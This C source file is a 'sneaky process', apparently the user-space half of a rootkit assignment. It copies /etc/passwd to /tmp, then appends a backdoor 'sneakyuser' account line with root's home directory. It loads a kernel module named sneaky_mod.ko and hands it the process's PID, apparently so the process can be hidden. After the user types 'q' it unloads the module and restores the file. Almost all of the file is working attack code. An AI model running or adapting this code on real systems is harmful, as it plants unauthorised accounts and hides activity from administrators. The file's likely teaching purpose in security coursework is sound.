// This is a sneaky process that will hide itself from the user.
// This attack program will execute system calls by calling relevant APIs((for process creation, file I/O, and receiving keyboard input from standardinput)from a user program.

// Functions:
// 1. print its own process ID to the screen, with this format:
// printf(“sneaky_process pid = %d\n”, getpid());
// 2. copy the /etc/passwd file to /tmp/passwd, and then append a new line to the end of /etc/passwd with this format:
// sneakyuser:abc123:2000:2000:sneakyuser:/root:bash

// 3. load the sneaky kernel module (sneaky_mod.ko) into kernel by calling insmod.

// 4. wait for the user to type “q” on the keyboard.

// 5. unload the sneaky kernel module from kernel by calling rmmod.

// 6. remove the line that was added to /etc/passwd in step 2.

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>

void copy_file(const char *src, const char *dst)
{
    int fd_src, fd_dst;
    char buffer[4096];
    ssize_t bytes_read;

    fd_src = open(src, O_RDONLY);
    fd_dst = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);

    while ((bytes_read = read(fd_src, buffer, sizeof(buffer))) > 0)
    {
        write(fd_dst, buffer, bytes_read);
    }

    close(fd_src);
    close(fd_dst);
}

void add_sneaky_user()
{
    FILE *passwd_file;

    passwd_file = fopen("/etc/passwd", "a");
    fputs("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n", passwd_file);
    fclose(passwd_file);
}

int main()
{
    char c;

    printf("sneaky_process pid = %d\n", getpid());

    // Step 2: Perform malicious act
    copy_file("/etc/passwd", "/tmp/passwd");
    add_sneaky_user();

    // Step 3: Load sneaky module
    pid_t pid = fork();
    if (pid == 0)
    {
        char pid_arg[32];
        snprintf(pid_arg, sizeof(pid_arg), "sneaky_pid=%d", getpid());
        execl("/sbin/insmod", "/sbin/insmod", "sneaky_mod.ko", pid_arg, (char *)NULL);
        exit(0);
    }
    waitpid(pid, NULL, 0);

    // Step 4: Loop until 'q' is pressed
    while ((c = getchar()) != 'q')
    {
    }

    // Step 5: Unload sneaky module
    pid = fork();
    if (pid == 0)
    {
        execl("/sbin/rmmod", "/sbin/rmmod", "sneaky_mod", (char *)NULL);
        exit(0);
    }
    waitpid(pid, NULL, 0);

    // Step 6: Restore /etc/passwd and remove sneakyuser
    copy_file("/tmp/passwd", "/etc/passwd");

    return 0;
}
